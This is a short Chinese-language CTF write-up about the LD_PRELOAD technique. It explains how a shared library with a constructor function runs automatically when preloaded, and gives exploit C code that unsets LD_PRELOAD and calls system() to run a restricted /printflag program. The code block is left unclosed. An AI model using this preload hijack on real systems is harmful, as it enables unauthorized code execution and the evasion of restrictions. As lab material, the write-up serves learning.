---
title: LD_PRELOAD
date: 2026-09-29
categories: CTF
tags: Linux LD_PRELOAD
---

## 题目描述
靶机系统内部存在`/printflag`程序，运行即可输出flag，但是无法直接调用。利用LD_PRELOAD预加载自定义动态链接库实现代码执行。

## 原理
1. `__attribute__((constructor))`：被该属性修饰的函数，在动态库加载的时候**自动执行**，不需要手动调用。
2. LD_PRELOAD 环境变量，可以优先加载我们自己写的so动态库，劫持程序流程。

## EXP代码
```c
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
void hack()
{
    unsetenv("LD_PRELOAD");
    system("/printflag");
}